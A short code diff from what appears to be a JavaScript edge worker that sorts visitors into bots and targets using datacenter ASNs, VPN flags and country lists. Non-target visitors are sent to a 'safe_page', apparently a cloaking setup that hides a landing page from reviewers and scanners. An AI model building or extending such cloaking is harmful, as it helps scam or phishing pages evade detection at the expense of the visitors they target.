@@ -832,7 +832,6 @@ const DATACENTER_ASNS = [
   20473, 63949, 39351, 398324, 13414, 30633
 ];
 
-const BLOCKED_COUNTRIES = ['CN', 'RU', 'IN', 'PK', 'BD', 'VN', 'IR', 'KP', 'BY'];
 const requestTracker = new Map();
 
 // Background Intelligence Gathering using KV Storage for true persistence
@@ -1530,7 +1529,7 @@ async function isVisitorABot(request, event) {
       const isVpn = ipData.type === 'VPN' || (ipData.vpn && ipData.vpn === 'yes');
       const asn = parseInt(ipData.asn) || 0;
       
-             // Check if visitor is from target countries first
+             // 🎯 GEO-FILTERING: Check if visitor is from target countries
        if (!ipData.isocode || !TARGET_COUNTRIES.includes(ipData.isocode)) {
          event.waitUntil(logTrafficEvent(request, 'safe_page', { 
            reason: 'geo_block', 
